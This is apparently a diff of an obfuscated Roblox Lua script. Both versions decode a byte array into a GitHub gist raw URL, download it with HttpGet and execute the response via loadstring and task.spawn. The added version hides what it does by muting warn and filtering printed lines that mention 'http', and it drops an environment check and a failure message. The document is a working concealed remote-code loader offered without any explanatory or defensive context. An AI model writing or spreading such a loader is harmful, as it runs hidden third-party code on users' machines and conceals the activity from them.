@@ -1,43 +1,35 @@
-local _1 = string; local _2 = table; local _3 = game;
-local _4 = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}
+local _0xR1 = string; local _0xR2 = table; local _0xR3 = game;
+local _0xR4 = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}
 
-local function _X(_D)
-    local _H = #_3.Name % 5 
-    local _K = 12 + _H
-    local _R = {}
-    for i = 1, #_D do
-        _R[i] = _1.char(_D[i] - _K + _H) 
+local _0xR5 = function(t)
+    local r = {}
+    for i = 1, #t do
+        r[i] = _0xR1.char(t[i] - 12)
     end
-    return _2.concat(_R)
+    return _0xR2.concat(r)
 end
 
-local _O = {
-    ["\103\101\116"] = function(s, u) return s:HttpGet(u, true) end,
-    ["\101\120\101"] = loadstring
+local _0xR6 = {
+    ["\103\101\116"] = _0xR3.HttpGet,
+    ["\108\111\100"] = loadstring
 }
 
-local function _S()
+local function _0xR7()
     local p, w = print, warn;
-    local function _A() return true end
-    print, warn = function() end, function() end;
+    print = function(...) if not tostring(...):find("http") then p(...) end end;
+    warn = function() end;
     
-
-    if getfenv(0) ~= getfenv(1) then return end 
-
-    local u = _X(_4) .. "?v=" .. math.random(1000, 9999)
-    local s, c = pcall(_O["\103\101\116"], _3, u)
+    local u = _0xR5(_0xR4) .. "?v=" .. math.random(1000, 9999)
+    local s, c = pcall(_0xR6["\103\101\116"], _0xR3, u, true)
     
-    print, warn = p, w;
+    print = p; warn = w;
     
-    if s and c and #c > 0 then
-        local f = _O["\101\120\101"](c)
+    if s and c then
+        local f = _0xR6["\108\111\100"](c)
         if f then 
-            task.spawn(f) 
+            return task.spawn(f) 
         end
-    else
-        
-        _3:GetService("TestService"):Message("SAVITAR: Connection Refused.")
     end
 end
 
-_S()
+_0xR7()
